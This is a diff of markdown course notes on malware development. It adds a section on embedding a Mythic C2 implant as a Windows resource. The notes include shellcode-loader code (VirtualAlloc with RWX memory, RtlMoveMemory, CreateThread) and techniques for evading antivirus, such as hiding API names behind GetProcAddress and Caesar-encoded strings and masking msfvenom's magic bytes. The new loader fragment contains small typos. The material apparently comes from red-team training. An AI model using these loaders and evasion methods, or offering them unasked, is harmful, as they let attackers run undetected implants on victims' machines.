@@ -14,13 +14,14 @@ easier to hide traffic and forces the target to rely on behavioral detections.
 Using `run -j` sets a given task to run automatically as a job in Metasploit.
 
 ### Mythic C2
+
 C2 where the community writes agents in any language. Used in the course.
 
 * C2: `https://github.com/its-a-feature/Mythic`
 * Agents: `https://github.com/MythicAgents/Athena`
 
-Starting mythic is as simple as `./mythic-cli start`. You log in at 
-https://127.0.0.1:8443 and the default password is generated and put
+Starting mythic is as simple as `./mythic-cli start`. You log in at
+`https://127.0.0.1:8443` and the default password is generated and put
 in the `.env` file within the mythic folder.
 
 According to their [github.io](https://mythicmeta.github.io/overview/) it looks
@@ -43,6 +44,7 @@ Due to the vastness of this documentation, there will almost always be another w
 these 3 objectives aside from the basic pathway covered in this course.
 
 ### A Place
+
 A place to put shellcode can be accomplished by using `VirualAlloc`, a memory allocation function
 in the Win32 API. This is an allocation function that will give us the memory we need. The schema
 is below:
@@ -72,6 +74,7 @@ Where `0` is the first available area, `payload_len` is a var equal to the size 
 `0x40` is the dword that sets the `rwx` permissions to the buffer.
 
 #### Moving to the Buffer
+
 This is a subrequisite of reserving a space in the buffer. You have to be able to move the shellcode
 to the space you've just reserved. This can be done with `RtlMoveMemory`:
 
@@ -93,17 +96,18 @@ The following is an example of what this would look like:
 Where `allocated_mem` is the pointer address of our `VirtualAlloc` chunk, `payload` is the unsigned character
 array of our payload (msfvenom output) and `length` is an int.
 
-
 ### Executing
+
 Exeuction can be handled with `CreateThread`, which will do exactly that:
 
 `CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload, 0, 0, 0);`
 
 Where the first 0 is security attributes, the second 0 sets the defualt stack size,
-the third argument is the thread start routine we want to use, and the last three 
+the third argument is the thread start routine we want to use, and the last three
 options control tying another thread in, start time delay and thread identification.
 
 ### Keeping it Alive
+
 There are a lot of ways to do this. We will use `WaitForSingleObject` here.
 
 ```c++
@@ -114,7 +118,7 @@ DWORD WaitForSingleObject(
 ```
 
 Where `hHandle` is the handle to watch and `dwMilliseconds` is the time limit before the process
-is killed. This can be set to infinity, however. We can do this in a number of ways, but 
+is killed. This can be set to infinity, however. We can do this in a number of ways, but
 `WaitForSingleObject(thread, -1);` is easy enough.
 
 ## First Malware
@@ -147,7 +151,7 @@ int main()
 ## Basic Obfuscation
 
 AV faces a number of limitations in the form of UX and network load. By unpacking and sandboxing everything
-that runs on any given machine, end user activity is slowed down. Because of this, AV uses heuristic 
+that runs on any given machine, end user activity is slowed down. Because of this, AV uses heuristic
 analysis to speed up the scanning and quarantining process. These could include, but are not limited to:
 
 * Checking character buffers for known malicious strings
@@ -157,8 +161,8 @@ analysis to speed up the scanning and quarantining process. These could include,
 Basic AV is typically limited to these heuristics only. Enterprise AV/EDR has ML involved that
 requires another course, so this will only cover entry/consumer AV.
 
-_msfvenom prints 4 magic bytes at the start of every payload it generates_. These bytes are 
-`fc4883e4` and they are a smoking gun for AV detections, especially when you also have an IP 
+_msfvenom prints 4 magic bytes at the start of every payload it generates_. These bytes are
+`fc4883e4` and they are a smoking gun for AV detections, especially when you also have an IP
 address in the shellcode as well.
 
 There are a few basic things we can do to bypass these detections, though. They are simple:
@@ -294,7 +298,7 @@ script because they know we are using a likely malicious combination
 of function calls.
 
 We can hide the functions by naming them something else or calling them
-via a global function. Let's look at `VirtualAlloc` for example. We can 
+via a global function. Let's look at `VirtualAlloc` for example. We can
 abstract the functionality of `VirtualAlloc` using the following C++:
 
 ```c++
@@ -451,3 +455,136 @@ Caesar((char*)mvm, strlen(mvm), 322);
 MVM mvminit = (MVM) GetProcAddress(GetModuleHandleA(kl32), mvm);
 mvminit(execute, notbuf, notbuf_len);
 ```
+
+## Using Resource Files
+
+Using headers or imports can help obfuscate malware and help the
+shellcode loaders stay smaller. C data types also have size limits,
+so if you're trying to use a character array of size greater than
+65,535 you might run into a problem. Creating a resource file requires
+three things:
+
+1. A Header File
+2. A Resource script
+3. Resources outlined in that script
+
+VS IDE makes it really easy to generate resource files. You just have to
+declare the type of resource. Once we have developed it, there are 3 things
+we need:
+
+1. A way to find the resource
+2. A way to load the resource
+3. A way to call the place it's stored
+
+Which we can do with the following functions:
+
+### FindResourceA
+
+We can use this method to find the resource we want to load:
+
+```c++
+HRSRC FindResourceA(
+    [in, optional]  HMODULE hModule,
+    [in]            LPCSTR  lpName,
+    [in]            LPCSTR  lpType
+);
+```
+
+`hModule` is almost always `NULL` because we want the program to
+search within the current process. `lpName` can be either a pointer
+or a `MAKEINTRESOURCE<ID>` generated when our resource is created.
+The final option `lpType` is pretty much always going to be `RT_RCDATA`
+because we aren't going to be loading images or stuff like that into
+our malware (this isn't a cracker). Here is an example of the function:
+
+`FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);`
+
+Where `IDR_RCDATA1` is our resource ID.
+
+### LoadResource
+
+```c++
+HGLOBAL LoadResource(
+    [in, optional]  HMODULE hModule,
+    [in]            HRSRC   hResInfo
+);
+```
+
+Again, `HMODULE` is going to be `NULL` and the `hResInfo` variable is
+going to be the variable output from our `FindResource` call:
+
+`LoadResource(NULL, resource);`
+
+### LockResource
+
+```c++
+LPVOID LockResource(
+    [in]    HGLOBAL hResData
+);
+```
+
+This will let you call the resource you've loaded. The `hResData`
+variable is just the handle from `LoadResource`. It looks like
+ `LockResource(resource);`
+
+### Resource Errata
+
+Because the information is initialized much earlier than it was
+previously in the original script, we can't use `sizeof` or `strlen`
+to get the size of our shellcode anymore. Instead, we have to use
+`SizeofResource`, which looks like `SizeofResource(NULL, resource);`
+where `resource` is the FindResource handle.
+
+### Malware with Headers
+
+When you cook up a payload in Mythic GUI, there is a section where
+you can pick the commands your C2 implant is going to be able to
+handle. You want the minimum amount of commands required to run.
+If you need more later you can load them later since you will have
+a connection to the implant. `load` and `exit` are a good starting
+point. `run` and `shell` are added in the tutorial as another two
+solid choices.
+
+When you finalize the payload generation through Mythic,
+_put an extension at the end of your filename_. If you don't do this
+and you do include an extesion in your obfuscation you're going to fuck
+up your payload.
+
+When it comes time to import the payload as a resource file, use `RCDATA`
+as the import type. After the resource file as been imported, you include
+it with quotes instad of gators like: `#include "resource.h"`. Now our
+main function will look more like this:
+
+```c++
+void* execute;
+HANDLE thread;
+HRSRC resource;
+HGLOBAL resourceHandle = NULL;
+unsigned char* notbuf;
+unsigned int notbut_len;
+
+// load resource
+resource = FindResource(NULL, MAKTEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
+// you will need to look at the resource file to get the id.
+// it will be included next to "define"
+resourceHandle = LoadResource(NULL, resource);
+notbuf = (unsigned char*)LockResource(resourceHandle);
+notbuf_len = SizeofResource(NULL, resource);
+```
+
+The rest of the script should remain unchanged, and should build without
+issue. However, the detection should increase for this payload because
+our entire shellcode/implant is completely unobfuscated. To fix this,
+we need to obfuscate the resource file.
+
+## Obfuscating Resource Files
+
+The golden rule of obfuscation is that you need to maintain
+the integrity of the data. bins stay as bins, images stay as images.
+Also, because the data is "locked", we can't de-obfuscate until
+after the data is moved from the resource into a buffer. C++ can
+do this quite easily with pointers, fortunately.
+
+When you work with binary data in Python3 there's too much fucking
+error checking for you to work with it without binascii so be ready
+to use that library.
